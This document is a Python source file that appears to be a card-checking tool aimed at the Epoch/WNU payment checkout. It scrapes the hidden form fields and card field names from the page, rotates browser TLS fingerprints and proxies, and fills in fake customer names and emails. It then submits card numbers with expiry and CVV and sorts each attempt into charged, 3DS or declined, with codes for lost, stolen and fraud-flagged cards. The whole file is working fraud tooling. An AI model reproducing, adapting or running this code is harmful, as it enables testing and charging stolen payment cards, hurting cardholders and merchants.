import time
import re
import random
import string
import json
import asyncio
import logging
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
import tls_client

log = logging.getLogger("epoch_tls")

BROWSER_PROFILES = [
    "chrome_120",
    "chrome_119",
    "chrome_117",
]

def get_random_string(length=10):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def get_random_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))
    num = random.randint(10, 99)
    return f"{name}{num}@{random.choice(domains)}"

def get_random_name():
    first = ["John", "James", "Michael", "David", "Robert", "William", "Sarah", "Emily"]
    last = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]
    return random.choice(first), random.choice(last)


def _get_session(proxy: str = None) -> tls_client.Session:
    session = tls_client.Session(
        client_identifier=random.choice(BROWSER_PROFILES),
        random_tls_extension_order=True
    )
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session


def _base_headers(referer: str = "https://wnu.com/") -> dict:
    return {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        "Origin": "https://wnu.com",
        "Referer": referer,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
    }


async def get_checkout_info(url: str, proxy: str = None) -> dict:
    """
    Fetches the Epoch/WNU checkout page, extracts hidden form fields,
    pi_code, tokens, merchant info, and the form action URL.
    """
    try:
        session = _get_session(proxy)
        headers = _base_headers()

        res = await asyncio.to_thread(session.get, url, headers=headers, timeout_seconds=20)

        if res.status_code != 200:
            return {"error": f"Failed to load Epoch page (Status: {res.status_code})"}

        html = res.text
        final_url = url  # tls_client doesn't expose redirect URL easily

        # Parse URL parameters for merchant info
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        pi_code = params.get("pi_code", params.get("x_pi_code", [""]))[0]
        tokens = params.get("x_tokens", [""])[0]
        reseller = params.get("reseller", ["a"])[0]
        username = params.get("username", [""])[0]
        x_referer = params.get("x_referer", [""])[0]

        # Extract the form action URL from the HTML
        form_action = None
        form_match = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if form_match:
            action = form_match.group(1)
            if action.startswith("http"):
                form_action = action
            else:
                form_action = urljoin("https://wnu.com", action)

        if not form_action:
            form_action = "https://wnu.com/secure/services/"

        # Extract ALL hidden input fields from the form
        hidden_fields = {}
        for m in re.finditer(
            r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
            html, re.IGNORECASE
        ):
            hidden_fields[m.group(1)] = m.group(2)
        # Also match reversed order: name before type
        for m in re.finditer(
            r'<input[^>]*name=["\']([^"\']+)["\'][^>]*type=["\']hidden["\'][^>]*value=["\']([^"\']*)["\']',
            html, re.IGNORECASE
        ):
            if m.group(1) not in hidden_fields:
                hidden_fields[m.group(1)] = m.group(2)
        # Match: name ... value (without type explicitly hidden, but in hidden context)
        for m in re.finditer(
            r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\'][^>]*type=["\']hidden["\']',
            html, re.IGNORECASE
        ):
            if m.group(1) not in hidden_fields:
                hidden_fields[m.group(1)] = m.group(2)

        # Extract the epoch_digest from URL or hidden fields
        epoch_digest = params.get("epoch_digest", [""])[0]
        if not epoch_digest and "epoch_digest" in hidden_fields:
            epoch_digest = hidden_fields["epoch_digest"]

        # Try to determine merchant name from the page
        merchant = "Epoch Merchant"
        # Check x_referer for merchant domain
        if x_referer:
            try:
                ref_parsed = urlparse(x_referer)
                merchant = ref_parsed.netloc.replace("www.", "").split(".")[0].title()
            except Exception:
                pass

        # Also try to extract from page title or merchant display
        title_match = re.search(r'<title[^>]*>([^<]+)</title>', html, re.IGNORECASE)
        if title_match:
            title = title_match.group(1).strip()
            if title and "epoch" not in title.lower() and "wnu" not in title.lower():
                merchant = title[:50]

        # Extract token/price info
        amount = 0.0
        currency = "USD"
        if tokens:
            try:
                amount = float(tokens) / 100  # tokens are often in cents
            except ValueError:
                pass

        # Try to find price display on page
        price_match = re.search(r'\$\s*([\d,.]+)', html)
        if price_match:
            try:
                amount = float(price_match.group(1).replace(",", ""))
            except ValueError:
                pass

        # Detect card input field names from the form
        card_field_names = {
            "cc_number": "ccnum",
            "cc_month": "expmonth",
            "cc_year": "expyear",
            "cc_cvv": "cvv2",
        }

        # Try to find actual field names from the HTML
        for field_type, default_name in [
            ("cc_number", "ccnum"),
            ("cc_month", "expmonth"),
            ("cc_year", "expyear"),
            ("cc_cvv", "cvv2"),
        ]:
            # Look for input fields that contain card-related names
            patterns = {
                "cc_number": [r'name=["\'](\w*(?:card|cc|ccnum|cardnum|card_number|cc_number)\w*)["\']'],
                "cc_month": [r'name=["\'](\w*(?:expmonth|exp_month|ccmonth|cc_month)\w*)["\']'],
                "cc_year": [r'name=["\'](\w*(?:expyear|exp_year|ccyear|cc_year)\w*)["\']'],
                "cc_cvv": [r'name=["\'](\w*(?:cvv|cvv2|cvc|security_code|cardcvv)\w*)["\']'],
            }
            for pat in patterns.get(field_type, []):
                m = re.search(pat, html, re.IGNORECASE)
                if m:
                    card_field_names[field_type] = m.group(1)
                    break

        return {
            "pi_code": pi_code,
            "tokens": tokens,
            "reseller": reseller,
            "username": username,
            "epoch_digest": epoch_digest,
            "merchant": merchant,
            "amount": amount,
            "currency": currency,
            "form_action": form_action,
            "hidden_fields": hidden_fields,
            "card_field_names": card_field_names,
            "url": url,
            "x_referer": x_referer,
            "raw_html_len": len(html),
        }

    except Exception as e:
        log.error(f"Epoch get_checkout_info error: {e}")
        return {"error": f"Error fetching checkout: {str(e)[:80]}"}


async def charge_card(card: dict, checkout: dict, proxy: str = None) -> dict:
    """
    Attempts to charge a card via Epoch's WNU payment form.
    Submits card data to the form action URL with all hidden fields.
    """
    start_time = time.perf_counter()
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": "FAILED",
        "response": "",
        "decline_code": "",
        "time": 0.0
    }

    try:
        session = _get_session(proxy)
        
        form_action = checkout.get("form_action", "https://wnu.com/secure/services/")
        hidden_fields = checkout.get("hidden_fields", {})
        card_fields = checkout.get("card_field_names", {})
        
        # Build the POST payload with all hidden fields
        payload = dict(hidden_fields)
        
        # Add/override key fields from checkout info
        if checkout.get("pi_code"):
            payload["pi_code"] = checkout["pi_code"]
        if checkout.get("reseller"):
            payload["reseller"] = checkout["reseller"]
        if checkout.get("epoch_digest"):
            payload["epoch_digest"] = checkout["epoch_digest"]
        
        # Set API action
        payload["api"] = "join"
        
        # Generate random user info
        first_name, last_name = get_random_name()
        email = get_random_email()
        
        payload["email"] = email
        payload["name"] = f"{first_name} {last_name}"
        payload["no_userpass"] = "Y"
        
        # Add card data using detected field names
        cc_num_field = card_fields.get("cc_number", "ccnum")
        cc_month_field = card_fields.get("cc_month", "expmonth")
        cc_year_field = card_fields.get("cc_year", "expyear")
        cc_cvv_field = card_fields.get("cc_cvv", "cvv2")
        
        payload[cc_num_field] = card["cc"]
        payload[cc_month_field] = card["month"]
        payload[cc_year_field] = card["year"]
        payload[cc_cvv_field] = card["cvv"]
        
        # Set other common fields
        payload.setdefault("version", "4")
        payload.setdefault("state", "x")
        
        referer_url = checkout.get("url", "https://wnu.com/secure/services/")
        
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://wnu.com",
            "Referer": referer_url,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "Upgrade-Insecure-Requests": "1",
        }

        # POST the payment form
        res = await asyncio.to_thread(
            session.post,
            form_action,
            data=urlencode(payload),
            headers=headers,
            timeout_seconds=25
        )

        result["time"] = round(time.perf_counter() - start_time, 2)
        
        response_text = res.text
        response_lower = response_text.lower()
        
        # Parse the response to determine result
        # Epoch returns HTML pages with specific indicators
        
        # Check for success indicators
        if any(s in response_lower for s in [
            "transaction approved",
            "thank you for your purchase",
            "payment successful",
            "transaction complete",
            "successfully processed",
            "congratulations",
            "your membership",
            "welcome to",
            "transaction_status=y",
            "approved",
            "order confirmed",
        ]):
            result["status"] = "CHARGED"
            result["response"] = "Transaction Approved"
            
            # Try to extract transaction ID
            txn_match = re.search(r'(?:transaction|order|confirmation)[\s_-]*(?:id|number|#)?[\s:]*([A-Za-z0-9-]+)', response_text, re.IGNORECASE)
            if txn_match:
                result["response"] = f"Approved (TXN: {txn_match.group(1)[:20]})"
            return result
        
        # Check for 3DS / redirect
        if any(s in response_lower for s in [
            "3d secure",
            "3dsecure",
            "three-d secure",
            "payer authentication",
            "verification required",
            "redirect to bank",
            "authentication required",
            "securecode",
            "verified by visa",
            "mastercard identity check",
        ]):
            result["status"] = "3DS"
            result["response"] = "3DS Authentication Required"
            return result
        
        # Check for specific decline reasons
        decline_patterns = {
            "insufficient_funds": ["insufficient funds", "not enough funds", "insufficient balance"],
            "card_declined": ["card declined", "transaction declined", "card was declined", "decline"],
            "incorrect_cvc": ["incorrect cvc", "invalid cvv", "security code", "cvv mismatch", "invalid security code"],
            "expired_card": ["expired card", "card expired", "card has expired", "expiration date"],
            "invalid_card": ["invalid card", "invalid card number", "card number is invalid", "invalid account"],
            "do_not_honor": ["do not honor", "do not honour"],
            "lost_stolen": ["lost card", "stolen card", "pick up card", "pickup card"],
            "processing_error": ["processing error", "system error", "try again later"],
            "restricted": ["restricted card", "restricted", "not permitted"],
            "fraud": ["fraudulent", "suspected fraud", "fraud"],
        }
        
        decline_code = ""
        decline_msg = ""
        
        for code, patterns in decline_patterns.items():
            for pattern in patterns:
                if pattern in response_lower:
                    decline_code = code
                    decline_msg = pattern.title()
                    break
            if decline_code:
                break
        
        if decline_code:
            result["status"] = "DECLINED"
            result["decline_code"] = decline_code
            result["response"] = decline_msg
            return result
        
        # Try to extract error message from the response HTML
        error_msg = ""
        
        # Look for error divs/spans
        error_patterns = [
            r'class=["\'](?:error|alert|warning|decline|fail)[^"\']*["\'][^>]*>([^<]+)',
            r'<div[^>]*(?:error|alert|warning)[^>]*>([^<]+)',
            r'<span[^>]*(?:error|alert|warning)[^>]*>([^<]+)',
            r'<p[^>]*(?:error|alert)[^>]*>([^<]+)',
            r'(?:error|decline|fail|denied)[\s:]+([^<\n]{5,80})',
        ]
        
        for pat in error_patterns:
            m = re.search(pat, response_text, re.IGNORECASE)
            if m:
                error_msg = m.group(1).strip()
                if len(error_msg) > 5:
                    break
        
        # Check for general decline/error
        if any(s in response_lower for s in ["declined", "denied", "rejected", "failed", "error", "not processed"]):
            result["status"] = "DECLINED"
            result["response"] = error_msg if error_msg else "Transaction Declined"
            result["decline_code"] = "card_declined"
            return result
        
        # If we got a redirect (302/301) or empty response
        if res.status_code in (301, 302, 303):
            location = res.headers.get("Location", "")
            if "success" in location.lower() or "thank" in location.lower():
                result["status"] = "CHARGED"
                result["response"] = "Redirected to success"
            elif "error" in location.lower() or "decline" in location.lower():
                result["status"] = "DECLINED"
                result["response"] = "Redirected to error page"
            else:
                result["status"] = "DECLINED"
                result["response"] = f"Redirect: {location[:60]}"
            return result
        
        # If we still can't determine, check status code
        if res.status_code == 200:
            # Got a 200 but couldn't parse - check if it's a form page (payment page reloaded with error)
            if "ccnum" in response_lower or "card number" in response_lower:
                result["status"] = "DECLINED"
                result["response"] = error_msg if error_msg else "Payment form returned (likely declined)"
            else:
                result["status"] = "DECLINED"
                result["response"] = error_msg if error_msg else f"Unknown response (Status: {res.status_code})"
        else:
            result["status"] = "ERROR"
            result["response"] = f"HTTP {res.status_code}"
        
    except asyncio.TimeoutError:
        result["time"] = round(time.perf_counter() - start_time, 2)
        result["response"] = "Request timed out"
    except Exception as e:
        result["time"] = round(time.perf_counter() - start_time, 2)
        result["response"] = str(e)[:80]
        log.error(f"Epoch charge_card error: {e}")

    return result
